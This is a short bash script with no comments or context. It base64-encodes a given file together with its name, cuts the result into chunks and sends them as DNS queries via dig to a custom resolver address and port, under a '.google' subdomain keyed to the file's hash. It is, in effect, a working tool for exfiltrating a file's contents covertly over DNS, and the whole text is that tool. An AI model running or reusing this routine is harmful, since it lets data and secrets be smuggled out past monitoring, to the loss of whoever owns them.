#!/usr/bin/bash
f="$1"
s=3
b=10
c=0
d=0
export IDN_DISABLE=1
id=$(md5sum "$f")
for r in $(
    for i in $(
        echo -ne "$f\0\0" | cat - "$f" | base64 -w0 | sed "s/.\{$b\}/&-\n/g"
    )
    do
        if [[ "$c" -lt "$s"  ]]
        then
            echo -ne "$i."; c=$((c+1))
        else
            echo -ne "\n$i."
            c=1
        fi
    done
)
do
    dig @127.88.0.1 -p4444 +short "$(echo -ne "$r"|tr "+" "*")"$d."${id::4}".google
    d=$((d+1))
done
